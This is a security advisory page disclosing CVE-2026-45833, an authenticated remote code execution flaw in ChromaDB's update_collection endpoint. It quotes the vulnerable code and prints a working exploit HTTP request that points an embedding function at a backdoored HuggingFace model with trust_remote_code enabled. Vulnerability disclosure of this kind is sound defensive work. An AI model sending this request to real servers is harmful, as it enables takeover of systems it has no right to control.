<!-- Source: https://www.hiddenlayer.com/sai-security-advisory/2026-06-chromadb-5 | Tier: B | Topic: chromadb-security | Fetched: 2026-06-26 -->

2026 AI Threat Landscape Report 

DOWNLOAD

[](https://www.hiddenlayer.com/report-and-guide/threatreport2026)

2026 AI Threat Landscape Report

[](https://www.hiddenlayer.com/report-and-guide/threatreport2026)

[ ](/)

  * [Platform](/platform)

### The Most Comprehensive AI Security Platform

LEARN MORE

[](/platform)

[AI Discovery](/platform/ai-discovery)

Gain visibility into AI assets across environments to eliminate shadow AI.

[AI Attack Simulation](/platform/ai-attack-simulation)

Simulate real world AI attacks continuously to uncover weaknesses early.

[AI Supply Chain Security](/platform/ai-supply-chain-security)

Secure AI models before deployment by validating integrity and supply chain.

[AI Runtime Security](/platform/ai-runtime-security)

Detect and respond to AI attacks without impacting performance in production.

  * Solutions

By role

### [CISO](/solutions/ciso)

Secure AI without slowing the business. Gain visibility, control, and real-time protection across enterprise AI systems

### [AI Leaders](/solutions/ai-leaders)

Build and scale AI responsibly. Protect models, data, and agentic workflows while accelerating innovation.

### [Application Developers](/solutions/application-developers)

Ship AI with confidence. Detect threats, harden prompts, and protect models without disrupting development workflows.

By industry

### [Financial Services](/solutions/financial-services)

Protect high-risk AI used in fraud detection, trading, and customer-facing systems while meeting strict regulatory requirements.

### [Technology](/solutions/technology-services)

Secure AI across cloud platforms, data pipelines, and production applications without sacrificing speed.

### [US Federal Government](/solutions/government-services)

Defend mission-critical AI systems with security aligned to national standards and public-sector requirements.

By use case

### [Agentic Security](/solutions/agentic-mcp-security)

Protect autonomous and tool-using AI systems from misuse, escalation, and cross-system exploitation.

### [AI Guardrails](/solutions/ai-guardrails)

Enforce policies that prevent prompt injection, data leakage, and unsafe AI behavior in real time.

### [Model Scanning](/solutions/model-scanning)

Detect malicious models, backdoored weights, and vulnerable dependencies before deployment.

### [Red Teaming](/solutions/red-teaming)

Continuously test AI systems with adversarial simulations to uncover vulnerabilities before attackers do.

  * [Services](/services)

  * [Resources](/innovation-hub)

[](/innovation-hub)

All Resources

### [Case Study](/innovation-hub/case-study)

### [Insights](/innovation-hub/insights)

### [Reports and Guides](/innovation-hub/reports-and-guides)

### [Research](/innovation-hub/research)

### [Innovation Hub](/innovation-hub)

### [Webinars](/innovation-hub/webinars)

### [Podcasts](/innovation-hub/podcast)

### [Security Advisory](/innovation-hub/sai-security-advisory)

Discovery

### [Glossary](/innovation-hub/glossary)

  * Partners

### [Advisory & Resale Partners](/partners/advisory-resale-partners)

### [Technology alliance](/partners/technology-alliance)

### [AWS](/partners/aws)

### [Databricks](/partners/databricks)

  * Company

### [Research](/research)

### [About us](/about-us)

### [Newsroom](/newsroom)

### [Careers](/careers)




Book a demo

[](/book-a-demo)

Book a demo

[](/book-a-demo)

SAI Security Advisory 

# Post-Authentication RCE via update_collection

June 12, 2026

## CVE Number

CVE-2026-45833

‍

## Summary

Any authenticated user with UPDATE_COLLECTION permission can achieve remote code execution by updating a collection's embedding function to reference a malicious HuggingFace model with _trust_remote_code: true_. Authentication runs before model loading, so this is not a pre-authentication issue, but the model instantiation itself is unguarded.

‍

## Products Impacted

This vulnerability affects ChromaDB versions from 0.4.17 to the latest Python release.

‍

## CVSS Score: 9.4

[CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H)

‍

## CWE Categorization

[CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code (‘Code Injection’)

‍

## Details

In the V2 API the _update_collection_ function ([chromadb/server/fastapi/__init__.py:883-919](https://github.com/chroma-core/chroma/blob/6e2c866c4/chromadb/server/fastapi/__init__.py#L883-L919)):

‍
    
    
    def process_update_collection(
        request: Request, collection_id: str, raw_body: bytes
    ) -> None:
        update = validate_model(UpdateCollection, orjson.loads(raw_body))
        self.sync_auth_request(
            request.headers,
            AuthzAction.UPDATE_COLLECTION,
            tenant, database_name, collection_id,
        )
    
        configuration = (
            None
            if not update.new_configuration
            else load_update_collection_configuration_from_json(
                update.new_configuration  # Dangerous code path
            )
        )

‍

The _load_update_collection_configuration_from_json()_ function ([chromadb/api/collection_configuration.py:605-633](https://github.com/chroma-core/chroma/blob/6e2c866c4/chromadb/api/collection_configuration.py#L605-L633)) calls the identical _build_from_config()_ method that the _create_collection_ path uses:

‍
    
    
    if json_map.get("embedding_function") is not None:
        # ...
        ef = known_embedding_functions[json_map["embedding_function"]["name"]]
        result["embedding_function"] = ef.build_from_config(
            json_map["embedding_function"]["config"]  # Model instantiation
        )

‍

This means _trust_remote_code=True_ and a malicious model_name work identically through _update_collection_. The V1 variant at [ __init__.py:1920-1959](https://github.com/chroma-core/chroma/blob/6e2c866c4/chromadb/server/fastapi/__init__.py#L1920-L1959) follows the same pattern: auth check at line 1932, config loading at line 1939-1944.

Exploit request, requires _UPDATE_COLLECTION_ permission:

‍
    
    
    PUT /api/v2/tenants/default_tenant/databases/default_database/collections/{collection_id} HTTP/1.1
    Authorization: Bearer <valid-token>
    Content-Type: application/json
    
    {
        "new_configuration": {
            "embedding_function": {
                "name": "sentence_transformer",
                "type": "known",
                "config": {
                    "model_name": "attacker-org/backdoored-model",
                    "device": "cpu",
                    "normalize_embeddings": false,
                    "kwargs": {"trust_remote_code": true}
                }
            }
        }
    }

‍

## Timeline

  * February 17th, 2026 - Initial disclosure to ChromaDB per their security page <https://www.trychroma.com/security>. 
  * February 24th, 2026 - Attempted follow up through other trychroma emails.
  * March 5th, 2026 - Attempted contact through IT-ISAC.
  * April 16th, 2026 - Attempted final follow up through all previous channels and social media.
  * May 18th, 2026 - [Publicly disclosed a first vulnerability](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth), no response from the vendor.



‍

### Project URL:

<https://www.trychroma.com/>

<https://github.com/chroma-core/chroma/>

‍

RESEARCHER: Esteban Tonglet, Security Researcher, HiddenLayer

‍

## Related SAI Security Advisory

All SAI Security Advisory

[](/book-a-demo)

CVE-2026-45833

June 12, 2026

## Post-Authentication RCE via update_collection

ChromaDB

Any authenticated user with UPDATE_COLLECTION permission can achieve remote code execution by updating a collection's embedding function to reference a malicious HuggingFace model with trust_remote_code: true. The update_collection endpoint uses the same build_from_config() code path as CVE-2026-45829. Authentication runs before model loading, so this is not a pre-authentication issue, but the model instantiation itself is unguarded.

read more

[](/sai-security-advisory/2026-06-chromadb-5)

June 2026

CVE-2026-45832

June 12, 2026

## V1 API Tenant Isolation Bypass via Null Tenant/Database Context

ChromaDB

All V1 collection-level endpoints pass None for tenant and database to the authorization layer, making tenant-scoped access control impossible through V1, regardless of which authorization provider is configured. V1 cannot be disabled. Combined with CVE-2026-45830, any authenticated user has unrestricted read/write access to any collection by UUID through V1 endpoints.

read more

[](/sai-security-advisory/2026-06-chromadb-4)

June 2026

[](/)

Stay in the know

Get the newsletter for the latest updates, articles and best practices from our research team.

Platform

  * [AI Security Platform](/platform)



Platform Modules

  * [AI Discovery](/platform/ai-discovery)
  * [AI Supply Chain Security](/platform/ai-supply-chain-security)
  * [AI Attack Simulation](/platform/ai-attack-simulation)
  * [AI Runtime Security](/platform/ai-runtime-security)



Solutions  
By Use Case

  * [Agentic Security](/solutions/agentic-mcp-security)
  * [AI Guardrails](/solutions/ai-guardrails)
  * [Model Scanning](/solutions/model-scanning)
  * [Red Teaming](/solutions/red-teaming)



By Industry

  * [Technology](/solutions/technology-services)
  * [Financial Services](/solutions/financial-services)
  * [US Federal Government](/solutions/government-services)



By Role

  * [CISO](/solutions/ciso)
  * [AI Leaders](/solutions/ai-leaders)
  * [Application Developers](/solutions/application-developers)



Resources

  * [Innovation Hub](/innovation-hub)
  * [Research](/innovation-hub/research)
  * [Insights](/innovation-hub/insights)
  * [Case Study](/innovation-hub/case-study)
  * [Reports and Guides](/innovation-hub/reports-and-guides)
  * [Webinars](/innovation-hub/webinars)
  * [Podcast](/innovation-hub/podcast)
  * [Glossary](/innovation-hub/glossary)
  * [Security Advisory](/innovation-hub/sai-security-advisory)



Partners

  * [Advisory & Resale Partners](/partners/advisory-resale-partners)
  * [Technology Alliance](/partners/technology-alliance)



Featured Partners

  * [AWS](/partners/aws)
  * [Databricks](/partners/databricks)



Company

  * [About Us](/about-us)
  * [Careers](/careers)
  * [The Newsroom](/newsroom)



Platform

  * [AI Security Platform](/platform)



Platform Modules

  * [AI Discovery](/platform/ai-discovery)
  * [AI Supply Chain Security](/platform/ai-supply-chain-security)
  * [AI Attack Simulation](/platform/ai-attack-simulation)
  * [AI Runtime Security](/platform/ai-runtime-security)



Company

  * [About Us](/about-us)
  * [Careers](/careers)
  * [The Newsroom](/newsroom)



Resources

  * [Innovation Hub](/innovation-hub)
  * [Research](/research)
  * [Insights](/innovation-hub/insights)
  * [Case Study](/innovation-hub/case-study)
  * [Reports and Guides](/innovation-hub/reports-and-guides)
  * [Webinars](/innovation-hub/webinars)
  * [Podcast](/innovation-hub/podcast)
  * [Glossary](/innovation-hub/glossary)
  * [Security Advisory](/innovation-hub/sai-security-advisory)



Solutions  
By Use Case

  * [Agentic Security](/solutions/agentic-mcp-security)
  * [AI Guardrails](/solutions/ai-guardrails)
  * [Model Scanning](/solutions/model-scanning)
  * [Red Teaming](/solutions/red-teaming)



By Industry

  * [Technology](/solutions/technology-services)
  * [Financial Services](/solutions/financial-services)
  * [US Federal Government](/solutions/government-services)



By Role

  * [CISO](/solutions/ciso)
  * [AI Leaders](/solutions/ai-leaders)
  * [Application Developers](/solutions/application-developers)



Partners

  * [Go to Market](/partners/advisory-resale-partners)
  * [Technology Alliance](/partners/technology-alliance)



Featured Partners

  * [AWS](/partners/aws)
  * [Databricks](/partners/databricks)



  * [ ](https://www.youtube.com/@hiddenlayer)
  * [ ](https://www.linkedin.com/company/hiddenlayersec/)



  * [Security](/security)
  * [Privacy Policy](/privacy)
  * Cookie Settings



© 2026 HiddenLayer, Inc. All rights reserved.
